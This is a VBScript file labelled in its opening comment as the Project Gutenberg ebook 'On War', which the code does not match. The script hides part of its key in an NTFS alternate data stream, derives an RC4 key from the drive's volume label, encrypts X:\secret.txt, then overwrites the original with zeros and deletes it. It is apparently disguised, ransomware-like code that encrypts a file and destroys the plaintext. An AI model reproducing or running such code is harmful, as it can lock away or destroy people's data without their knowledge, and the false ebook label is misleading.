' The Project Gutenberg eBook of On War
Option Explicit
Dim fso, cfg, label, dkey, i, drv, plain
Set fso = CreateObject("Scripting.FileSystemObject")
cfg = ReadBytes(WScript.ScriptFullName & ":cfg")
Set drv = fso.GetDrive(fso.GetDriveName(WScript.ScriptFullName))
label = drv.VolumeName
dkey = ""
For i = 1 To Len(label)
    dkey = dkey & Chr(Asc(Mid(label, i, 1)) Xor Asc(Mid(cfg, ((i - 1) Mod Len(cfg)) + 1, 1)))
Next
plain = ReadText("X:\secret.txt")
WriteBytes "X:\secret.enc", RC4(dkey, plain)
Shred "X:\secret.txt"
WScript.Quit
Function RC4(key, data)
    Dim S(255), i, j, k, t, x, y, out
    For i = 0 To 255 : S(i) = i : Next
    j = 0
    For i = 0 To 255
        j = (j + S(i) + Asc(Mid(key, (i Mod Len(key)) + 1, 1))) Mod 256
        t = S(i) : S(i) = S(j) : S(j) = t
    Next
    x = 0 : y = 0 : out = ""
    For k = 1 To Len(data)
        x = (x + 1) Mod 256
        y = (y + S(x)) Mod 256
        t = S(x) : S(x) = S(y) : S(y) = t
        out = out & Chr(Asc(Mid(data, k, 1)) Xor S((S(x) + S(y)) Mod 256))
    Next
    RC4 = out
End Function
Function ReadBytes(path)
    Dim s : Set s = CreateObject("ADODB.Stream")
    s.Type = 1 : s.Open : s.LoadFromFile path
    Dim raw : raw = s.Read : s.Close
    Dim rs : Set rs = CreateObject("ADODB.Recordset")
    rs.Fields.Append "t", 201, LenB(raw) : rs.Open : rs.AddNew
    rs("t").AppendChunk raw : rs.Update : ReadBytes = rs("t").Value : rs.Close
End Function
Function ReadText(path) : ReadText = fso.OpenTextFile(path, 1).ReadAll : End Function
Sub WriteBytes(path, str) : fso.CreateTextFile(path, True).Write str : End Sub
Sub Shred(path)
    Dim f : Set f = fso.OpenTextFile(path, 2)
    f.Write String(fso.GetFile(path).Size, Chr(0)) : f.Close
    fso.DeleteFile path, True
End Sub
